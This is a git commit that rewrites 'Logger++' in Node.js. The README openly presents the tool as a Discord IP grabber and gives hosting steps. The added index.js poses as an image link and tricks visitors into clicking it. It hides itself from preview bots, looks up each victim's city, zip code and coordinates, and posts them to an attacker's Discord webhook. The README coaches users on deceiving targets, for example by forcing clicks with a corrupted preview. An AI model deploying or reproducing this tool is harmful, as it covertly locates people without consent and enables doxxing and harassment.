92d1babf0519e068793af180168611233362e896
Carter <NotCartxr@gmail.com>
2024-02-10 21:37:25 -0600

    v2 Revamp
    Rewrote Everything in NodeJS (Might be buggy if so make an issue).

--- README.md
+++ README.md
@@ -6,7 +6,9 @@
 Logger++ is a **powerful** *Open Source* Discord *IP Grabber*. <br>
 Where **you** can trick your Target into clicking a link for **their** ip.
 
-Logger++ is made possible using [**Vercel**](https://vercel.com/), [**Github**](https://github.com), [**Phython**](https://www.python.org/), & [**Discord**](https://discord.com/).
+Logger++ is made possible using [**Vercel**](https://vercel.com/), [**Github**](https://github.com), [**NodeJS**](https://nodejs.org/), & [**Discord**](https://discord.com/).
+
+*Logger++ has moved to node.js if you want the **old** python version* [***CLICK HERE***](https://github.com/Cartxrr/LoggerPlusPlus/tree/ae64c61185f1f18c170ba9fec5d592e2006c26db).
 
 # 🍎 Table of Contents
 
@@ -14,70 +16,46 @@ Logger++ is made possible using [**Vercel**](https://vercel.com/), [**Github**](
 * [**Table of Contents**](#-table-of-contents)
 * [**Documentation**](#-documentation)
     - [**Settings**](#-settings)
-        - [**Webhook**](#-webhook)
-        - [**Image**](#-image)
-        - [**Url**](#-url)
     - [**Creating a Webhook**](#-creating-a-webhook)
     - [**Hosting**](#-hosting)
 * [**Info**](#-info)
 
 # 📜 Documentation
 Logger++ has settings you can select and this will teach what each one does
-+ ## 🔧 Settings
-    + ## 📶 Webhook   
-        ```python
-        "url": "WEBHOOK_URL",
-        ```
-        > String - Required
++ ## 🔧 Settings  
+    ```json
+    "webhookurl": "WEBHOOK_URL",
+    ```
+    > String/Url - Required
 
-        The Discord Webhook Url in which the data will be sent through
-    + ## 📷 Image
-        ```python
-        "enabled": False,
-        ```
-        > Boolean - Required
+    The Discord Webhook Url in which the data will be sent through
 
-        Enables image logger mode.
+    **Q: How do I set this up?**<br>
+        A: If you [**Click Here**](#-creating-a-webhook) it will give you a tutorial on how to set up the webhook in Discord.
+    <br><br>
 
-        **Whats Image logger?**<br>
-        Image logger makes it where when ever they go to the link where the image/python file is it will show an image. You can make this Image logger work better with the corrupted image option as they will have to click the link to see the image. Try to trick your target into to middle clicking the image.
+    ```json
+    "imageurl": "IMAGE_URL",
+    ```
+    > String/Url - Required 
+    
+    The Image's URL in which will show
+
+    **Q: Whats Image logger?**<br>
+        A: Image logger makes it where when they go to the link is it will show an image. You can make this Image logger work better with the corrupted image option as they will have to click the link to see the image. Try to trick your target into to control/ctrl + middle clicking the image.
         <br><br>
 
-        ```python
-        "corrupted-image-preview": False,
-        ```
-        > Boolean
+    ```json
+    "corruptedimage": false
+    ```
+    > Boolean - Required 
+    
+    Enables Corrupted Image Preview in Discord
 
-        Enables corrupted image
-
-        **What does corrupted image do?**<br>
-        The corrupted image will make it where in discord the preview/embed that will so up for the image will never load and if it does load it will show an error so if a person wants to see the image they have to open the image/middle click it.
+    **Q: What does corrupted image do?**<br>
+        A: The corrupted image will make it where in discord the preview/embed that will so up for the image will never load and if it does load it will show an error so if a person wants to see the image they have to open the image/middle click it.
         <br><br>
 
-         ```python
-        "url": "IMAGE_URL",
-        ```
-        > String - Required
-
-        Image that will show up when clicked or if corrupted image is turned off what one will show up in preview/embed.
-    + ## 🔗 Url
-        ```python
-        "enabled": False,
-        ```
-        > Boolean - Required
-        
-        Enables url redirect mode
-
-        **Whats Does this do?**
-        What Url Redirect mode will do is basically replicate Grabify. So if they click on the link you will get there ip then it will bring them to a website of you're choice.
-        <br><br>
-
-        ```python
-        "url-redirect": "URL",
-        ```
-        > String - Required
-
-        What url will the target be redirected to after link is clicked
 
 
 
@@ -87,8 +65,8 @@ Logger++ has settings you can select and this will teach what each one does
 
     1. Make a Discord server.
     2. Open your server's settings and go to the integrations tab.
-    3. Click the "Create Webhook" button. <img src="https://support.discord.com/hc/article_attachments/1500000463501/Screen_Shot_2020-12-15_at_4.41.53_PM.png">
-    4. Now you have a webhook! <img src="https://support.discord.com/hc/article_attachments/360101553853/Screen_Shot_2020-12-15_at_4.51.38_PM.png">
+    3. Click the "Create Webhook" button. <img height=250 src="https://support.discord.com/hc/article_attachments/1500000463501/Screen_Shot_2020-12-15_at_4.41.53_PM.png">
+    4. Now you have a webhook! <img height=200 src="https://support.discord.com/hc/article_attachments/360101553853/Screen_Shot_2020-12-15_at_4.51.38_PM.png">
 
 + ## 🕸 Hosting
     To host this logger we will be using Vercel and Github
@@ -96,20 +74,17 @@ Logger++ has settings you can select and this will teach what each one does
     Steps:
     1. Make sure you have a Github and Vercel account
     2. Download this repo using git or githubs visual downloader.
-    3. Make a folder called **"api"**.
-    4. Drag **"main.py"** and **"requirements.txt"** into the **"api"** folder.
-    5. change your phython script to what ever you want to the url to be. (**Ex: youtube or hotdog** )
-    6. Make a github repo name it whatever you want your website to be called. (**Ex: linkshortner or imagehosting**)
-    7. press upload an existing file.
-    8. Now drag the **api** folder into your github repo. then commit changes.
+    3. Make a github **PRIVATE** repo name it whatever you want your website to be called. (**Ex: filely or imagehosting**)
+    4. press upload an existing file.
+    8. Now drag all files into the repo.
     9. Go to Vercel and make a new project.
     10. Pick your github repo. then press import. then deploy.
-    11. it should show you your website url go it it and add **/api/** and whatever you named your phython file **(DONT ADD THE .py)**.
-    12. send it to target and boom. **(Also if you go to it yourself you will get your ip first thing)**.
+    11. it should show you your website url go it it and add and whatever you want (**Ex: hotdog.png or bbc.jpg**).
+    12. send it to target and boom. **(Also if you go to it yourself you will get your ip)**.
 
 # ℹ Info
 
-I do not condone using this as it breaks Discord's TOS this project was just to test my phython coding skills.
+I do not condone using this as it breaks Discord's TOS.
 also if you want to make videos using this go ahead just add a link to the description please.
 
 **Please consider giving this repo a star 🌟**
---
+++ index.js
@@ -0,0 +1,167 @@
+//       __                                            //
+//      / /  ___   __ _  __ _  ___ _ __  _     _       //
+//     / /  / _ \ / _` |/ _` |/ _ \ '__|| |_ _| |_     //
+//    / /__| (_) | (_| | (_| |  __/ | |_   _|_   _|    //
+//    \____/\___/ \__, |\__, |\___|_|   |_|   |_|      //
+//                |___/ |___/                          //
+//                                                     //
+//       A Powerful Node.JS Discord Logger Tool.       //
+//        Made By: https://github.com/Cartxrr          //
+//         THIS REQUIRES NODEJS AND EXPRESS            // 
+//         ⚠ OPTIONS ARE IN CONFIG.JSON! ⚠            //
+//                                                     //
+                                                    // ^ ocd 😭
+                                                    
+// ⚠ DONT EDIT PAST THIS POINT IF YOU DONT KNOW WHAT YOU ARE DOING!! ⚠
+const app = require("express")();
+const https = require("https");
+const config = require("./config.json");
+// Requirements ^
+
+// My Crappy Request Function
+function request(options, data, callback) {
+  const req = https.request(options, function (res) {
+    let responseData = "";
+    res.on("data", (chunk) => {
+      responseData += chunk;
+    });
+    res.on("end", () => {
+      callback(responseData); // this crashes alot so uh if you can fix it please do 🙏
+    });
+  });
+
+  if (data !== null && data) req.write(JSON.stringify(data));
+  req.end();
+}
+
+// This Just Checks if the IP given is a Bot
+function checkifbot(ip) {
+  if (
+    (ip && ip.startsWith("35.")) ||
+    ip.startsWith("34.") ||
+    ip.startsWith("104.") ||
+    ip.startsWith("143.") ||
+    ip.startsWith("27.") ||
+    ip.startsWith("164.") ||
+    ip.startsWith("64.") // REMOVE IF YOU THINK THIS MIGHT SCREW YOU UP. (THIS IS VERCELS PREVIEW BOT IP)
+  )
+    return true;
+  else return false;
+}
+
+// THANK YOU DEKRYPTED FOR THIS
+const glitchedimgdata =
+  "\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xdb\x00C\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xdb\x00C\x01\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xc2\x00\x11\x08\x01\xe0\x01\xe0\x03\x01\x11\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x14\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xc4\x00\x14\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xda\x00\x0c\x03\x01\x00\x02\x10\x03\x10\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+
+app.get("/*", (req, res) => {
+  if (config.webhookurl == "WEBHOOK_URL") { res.status(500).send("PLEASE SET A WEBHOOK"); return; }
+  if (config.imageurl == null) { res.status(500).send("PLEASE SET A IMAGE"); return; }
+
+  let ip = req.headers["x-forwarded-for"];
+  if (checkifbot(ip) == true) {
+    if (config.corruptedimage == true) {
+      res.setHeader("Content-Type", "image/png");
+      res.send(Buffer.from(glitchedimgdata, "binary")); // use dekryped's sexy image data on bots so it like embeds corrupted and stuff
+    }
+    return;
+  }
+  request(
+    { hostname: "ipwho.is", path: `/${ip}`, method: "GET" }, // if you wanna change this go ahead just the other ones were rate limiting me because of vercel
+    null, // yuh
+    (data15) => {
+      data15 = JSON.parse(data15);
+
+      // good luck reading this shit
+      let data = {
+        content: "@everyone", // @everyone fuck you
+        embeds: [
+          {
+            description: `
+**🌐 IP:** \`${ip ? ip : "N/A"}\`
+**🧠 Internet Provider:** \`${
+              data15["connection"]["isp"] ? data15["connection"]["isp"] : "N/A"
+            }\`
+**🏁 Country:** \`${data15["country"] ? data15["country"] : "N/A"}/${
+              data15["country_code"] ? data15["country_code"] : "N/A"
+            }\`
+**🏴 Region:** \`${data15["region"] ? data15["region"] : "N/A"}/${
+              req.headers["x-vercel-ip-country-region"]
+                ? req.headers["x-vercel-ip-country-region"]
+                : data15["region_code"]
+                ? data15["region_code"]
+                : "N/A"
+            }\`
+**🏙 City:** \`${
+              data15["city"]
+                ? data15["city"]
+                : req.headers["x-vercel-ip-city"]
+                ? req.headers["x-vercel-ip-city"]
+                : "N/A"
+            }\`
+**🤐 ZipCode:** \`${data15["postal"] ? data15["postal"] : "N/A"}\`
+**📌 Coordinates:** \`${
+              req.headers["x-vercel-ip-latitude"]
+                ? req.headers["x-vercel-ip-latitude"]
+                : data15["latitude"]
+                ? data15["latitude"]
+                : "N/A"
+            }, ${
+              req.headers["x-vercel-ip-longitude"]
+                ? req.headers["x-vercel-ip-longitude"]
+                : data15["longitude"]
+                ? data15["longitude"]
+                : "N/A"
+            }\`
+**⌛ Timezone:** \`${
+              req.headers["x-vercel-ip-timezone"]
+                ? req.headers["x-vercel-ip-timezone"]
+                : data15["timezone"]["id"]
+                ? data15["timezone"]["id"]
+                : "N/A"
+            }/${
+              data15["timezone"]["abbr"] ? data15["timezone"]["abbr"] : "N/A"
+            }\` 
+**💻 User Agent:** \`${
+              req.headers["user-agent"] ? req.headers["user-agent"] : "N/A"
+            }\``,
+
+            footer: {
+              text: " @Cartxrr | Logger++ ", // just some credits to my self 💪
+              icon_url: "https://avatars.githubusercontent.com/u/116686230?v=4", // my github pfp ofc 🙄
+            },
+          },
+        ],
+      };
+
+      // Makes a sexy request to mr discord
+      request(
+        {
+          hostname: "discord.com",
+          path: config.webhookurl.replace("https://discord.com", ""),
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Content-Length": Buffer.byteLength(JSON.stringify(data)),
+          },
+        },
+        data,
+        () => {
+          if (config.imageurl !== "IMAGE_URL") {
+            https.get(config.imageurl, (response) => {
+              if (response.statusCode === 200) {
+                res.setHeader("Content-Type", "image/png");
+                response.pipe(res); // chatgpt helped me wit this >-< (im stupid)
+              } else
+                res
+                  .status(500)
+                  .send(config.imageurl + " Couldnt Be Downloaded"); // womp womp
+            });
+          }
+        }
+      );
+    }
+  );
+});
+app.listen(3000); // rAhhhhh LISTEN ON PORT 3000 BECAYSE 3000 IS SUPERIOR
+
+// Thank god prettier exists or else this would look like hell
